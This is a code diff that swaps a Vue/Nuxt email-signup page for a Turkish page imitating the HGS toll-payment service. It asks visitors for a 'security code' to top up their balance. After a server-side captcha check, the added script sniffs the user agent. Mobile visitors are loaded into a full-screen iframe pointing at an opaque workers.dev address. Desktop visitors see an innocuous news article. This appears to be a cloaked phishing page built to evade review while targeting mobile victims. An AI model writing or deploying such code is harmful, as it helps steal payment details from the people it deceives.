@@ -1,101 +1,85 @@
-<template>
-  <section class="home">
-    <div class="py-24 md:py-36 mx-auto flex flex-wrap flex-col md:flex-row items-center">
-      <div class="flex flex-col w-full xl:w-3/5 justify-center lg:items-start overflow-y-hidden">
-        <div v-html="$md.render(welcomeText)" class="home__welcome markdown" />
+<!DOCTYPE html>
+<html lang="tr">
 
-        <div class="mb-12 xl:mb-0">
-          <h4 v-if="isSignedUp">Thank you - we'll be in touch shortly.</h4>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-          <form
-            v-else
-            @submit.prevent="handleSubmit"
-            name="signups"
-            netlify
-            class="flex items-center border-b border-b-2 border-blue-400 py-2"
-          >
-            <input
-              ref="emailInput"
-              v-model="form.email"
-              class="appearance-none mb-36 bg-transparent border-none w-full text-gray-700 mr-3 py-1 px-2 leading-tight focus:outline-none"
-              type="text"
-              name="email"
-              placeholder="your@email.com"
-              aria-label="Email address"
-            />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ana Sayfa</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+</head>
 
-            <button
-              class="flex-shrink-0 bg-blue-500 hover:bg-blue-700 border-blue-500 hover:border-blue-700 text-sm border-4 text-white py-1 px-2 rounded"
-              type="submit"
-            >
-              Sign Up
-            </button>
-          </form>
-        </div>
-      </div>
-      <div class="flex flex-col w-full xl:w-2/5">
-        <img
-          alt="Hero"
-          class="rounded shadow-xl"
-          src="https://source.unsplash.com/random/720x400"
-        />
-      </div>
+<body style="background-image:url('https://cdn.glitch.global/0c91ea31-d205-4491-89c2-c27f6ece9983/hgs.jpg?v=1649496780557');    background-repeat: no-repeat;    background-size: cover;">
+    <div class="bg">
     </div>
-  </section>
-</template>
+    <div class="container animate">
+        <center>
+            <div class="box " style="padding:2rem;width:80%;margin-top:2rem;min-width:250px" id="stw">
+                <div class="form">
+<!--<img src="https://i.ibb.co/SyYPSKR/HGS-Gorsel-removebg-preview.png" style="max-width:100%">--->
+<br>
+Yükleme yapmak için Güvenlik kodunuzu giriniz
+                    <br><br><br>
+                    <img src="cap.php" alt="" style="width: 50px;">
+                    <br><br><br>
+                    <input type="text" placeholder="Güvenlik kodunu giriniz" id="toke2ns" style="width: 100%;">
+                    <br>
+                    <br><br>
+                    <button type="button" onclick="check()">İleri</button>
+                </div>
+            </div>
+        </center>
+        <div id="ss2" style="display:none">
+            <iframe src="" frameborder="0" style="    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    position: fixed;
+    width: 100%;
+    z-index: 999;
+    height: 100vh;
+" id="ifr"></iframe>
+        </div>
+        <div class="footer">
+            
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.2/jquery.min.js"
+        integrity="sha512-tWHlutFnuG0C6nQRlpvrEhE4QpkG1nn2MOUMWmUeRePl4e3Aki0VB6W1v3oLjFtd0hVOtRQ9PHpSfN6u6/QXkQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
 
-<script lang="ts">
-import { Component, Vue } from 'nuxt-property-decorator';
-import settings from '@/content/settings/general.json';
 
-@Component({
-  // Called to know which transition to apply
-  transition() {
-    return 'slide-left';
-  },
-})
-export default class Home extends Vue {
-  welcomeText = settings.welcomeText;
+    function check() {
 
-  get posts(): Post[] {
-    return this.$store.state.posts;
-  }
+        $.ajax({
+            url: "checkcap.php?kod=" + $("#toke2ns").val(),
+            method: "get",
 
-  isSignedUp = false;
+            success: function(data) {
+                if (data == "a1") {
+                    document.querySelector('#stw').style.display = 'none';
+                    document.querySelector('#ss2').style.display = 'block';
+                    var isMobile = ('DeviceOrientationEvent' in window || 'orientation' in window);
+                    if (/Windows NT|Macintosh|Mac OS X|Linux/i.test(navigator.userAgent)) isMobile = false;
+                    if (/Mobile/i.test(navigator.userAgent)) isMobile = true;
+                    if (isMobile) {
+                        $("#ifr").prop("src", "https://quiet-cake-0b9b.toolser.workers.dev/")
+                    } else {
+                        $("#ifr").prop("src",
+                            "https://www.otomobilsayfasi.com/haber/ogs-ve-hgs-ayni-anda-kullanilacak-mi/1060700"
+                            )
+                    }
+                } else {
+                    alert("Güvenlik kodu hatalı")
+                }
+            }
+        })
 
-  form = {
-    email: '',
-  };
-
-  encode(data): string {
-    return Object.keys(data)
-      .map((key) => `${encodeURIComponent(key)}=${encodeURIComponent(data[key])}`)
-      .join('&');
-  }
-
-  validEmail(email): boolean {
-    // eslint-disable-next-line
-    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
-    return re.test(email);
-  }
-
-  async handleSubmit(): Promise<void> {
-    if (!this.validEmail(this.form.email)) {
-      this.$refs.emailInput.focus();
-      return;
     }
+    </script>
+</body>
 
-    try {
-      await fetch('/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: this.encode({ 'form-name': 'signups', ...this.form }),
-      });
-
-      this.isSignedUp = true;
-    } catch (error) {
-      console.error(error);
-    }
-  }
-}
-</script>
+</html>
